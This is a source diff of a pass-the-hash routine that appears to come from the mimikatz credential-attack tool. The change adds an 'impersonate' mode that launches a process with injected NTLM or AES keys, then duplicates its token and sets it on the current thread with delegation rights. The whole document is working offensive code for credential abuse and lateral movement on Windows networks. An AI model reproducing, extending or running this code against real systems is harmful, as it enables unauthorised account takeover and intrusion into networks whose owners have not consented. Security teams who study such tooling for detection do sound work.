@@ -807,15 +807,20 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
 	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
 	DWORD dwNeededSize;
-	HANDLE hToken;
+	HANDLE hToken, hNewToken;
 	PROCESS_INFORMATION processInfos;
+	BOOL isImpersonate;
 
 	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
-			kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
-			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\n", szUser, szDomain, szRun);
+			isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
+#pragma warning(push)
+#pragma warning(disable:4996)			
+			kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
+#pragma warning(pop)
+			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
 
 			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
 			{
@@ -852,7 +857,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 					data.NtlmHash = ntlm;
 					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 				}
-				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
+				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 			}
 						
 			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
@@ -860,7 +865,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
 				{
 					kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
-					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
+					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
 					{
 						if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
 						{
@@ -871,23 +876,35 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 							kprintf(L"  \\_ kerberos - ");
 							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
 							kprintf(L"\n");
+
+							if(data.isReplaceOk)
+							{
+								if(isImpersonate)
+								{
+									if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
+									{
+										if(SetThreadToken(NULL, hNewToken))
+											kprintf(L"** Token Impersonation **\n");
+										else PRINT_ERROR_AUTO(L"SetThreadToken");
+										CloseHandle(hNewToken);
+									}
+									else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
+									NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
+								}
+								else NtResumeProcess(processInfos.hProcess);
+							}
+							else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
 						}
 						else PRINT_ERROR_AUTO(L"GetTokenInformation");
 						CloseHandle(hToken);
 					}
 					else PRINT_ERROR_AUTO(L"OpenProcessToken");
-
-					if(data.isReplaceOk)
-						NtResumeProcess(processInfos.hProcess);
-					else
-						NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
-
 					CloseHandle(processInfos.hThread);
 					CloseHandle(processInfos.hProcess);
 				}
 				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
 			}
-			else PRINT_ERROR(L"Missing at least one argument : ntlm OR aes128 OR aes256\n");
+			else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");
 		}
 		else PRINT_ERROR(L"Missing argument : domain\n");
 	}
